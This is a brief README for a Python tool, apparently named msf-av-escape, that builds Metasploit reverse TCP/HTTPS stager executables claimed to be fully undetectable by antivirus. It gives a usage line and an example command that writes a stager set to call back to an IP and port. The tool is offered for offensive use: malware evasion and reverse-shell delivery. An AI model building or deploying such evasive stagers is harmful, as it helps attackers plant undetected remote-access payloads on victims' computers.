msf-av-escape
=============

Metasploit reverse TCP/HTTPS stagers fully undetectable with Python binary generator. 

# Usage

```
Usage gen_exe.py <template file> <ip> <port> 
```

# Example

```
./gen_exe.py reverse_tcp/rev_tcp.exe 192.168.1.10 8080 > ~/msf_tcp_stager.exe

```
